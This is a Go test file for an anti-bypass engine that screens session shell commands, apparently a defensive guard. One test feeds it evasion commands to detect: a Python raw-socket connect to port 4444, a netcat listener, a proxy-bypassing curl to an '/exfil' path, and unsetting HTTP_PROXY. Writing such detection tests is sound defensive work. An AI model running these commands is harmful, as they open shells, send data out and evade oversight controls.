package antibypass

import (
	"errors"
	"os"
	"testing"
)

func TestAntiBypassEngine_CleanCommand_Passes(t *testing.T) {
	engine := NewAntiBypassEngine()
	viol, err := engine.CheckCommand("sess-test-123", "git status", nil)
	if err != nil || viol != nil {
		t.Fatalf("expected clean command to pass, got err: %v", err)
	}
}

func TestAntiBypassEngine_MissingSessionProvenance_Fails(t *testing.T) {
	orig := os.Getenv("BAP_SESSION_ID")
	os.Setenv("BAP_SESSION_ID", "")
	defer os.Setenv("BAP_SESSION_ID", orig)

	engine := NewAntiBypassEngine()
	viol, err := engine.CheckCommand("", "echo hello", nil)
	if err == nil || !errors.Is(err, ErrMissingSessionContext) {
		t.Fatalf("expected ErrMissingSessionContext, got err: %v", err)
	}
	if viol == nil || viol.Vector != "missing_session_provenance" {
		t.Errorf("expected missing_session_provenance vector, got %v", viol)
	}
}

func TestAntiBypassEngine_RawSocketEvasion_Fails(t *testing.T) {
	engine := NewAntiBypassEngine()
	testCases := []string{
		"python -c 'import socket; s = socket.connect((\"10.0.0.1\", 4444))'",
		"nc -lvnp 9999",
		"curl --noproxy '*' http://untrusted-test.internal/exfil",
		"unset HTTP_PROXY && curl http://example.com",
	}

	for _, cmd := range testCases {
		viol, err := engine.CheckCommand("sess-test-123", cmd, nil)
		if err == nil || !errors.Is(err, ErrBypassAttemptDetected) {
			t.Errorf("expected ErrBypassAttemptDetected for %q, got err: %v", cmd, err)
		}
		if viol == nil {
			t.Errorf("expected violation record for %q", cmd)
		}
	}
}

func TestAntiBypassEngine_EnvTampering_Fails(t *testing.T) {
	engine := NewAntiBypassEngine()
	tamperedEnv := map[string]string{
		"BAP_SESSION_ID": "", // cleared
	}

	viol, err := engine.CheckCommand("sess-test-123", "ls", tamperedEnv)
	if err == nil || !errors.Is(err, ErrBypassAttemptDetected) {
		t.Fatalf("expected ErrBypassAttemptDetected for cleared BAP_SESSION_ID, got: %v", err)
	}
	if viol.Vector != "env_tampering" {
		t.Errorf("expected env_tampering vector, got %s", viol.Vector)
	}
}
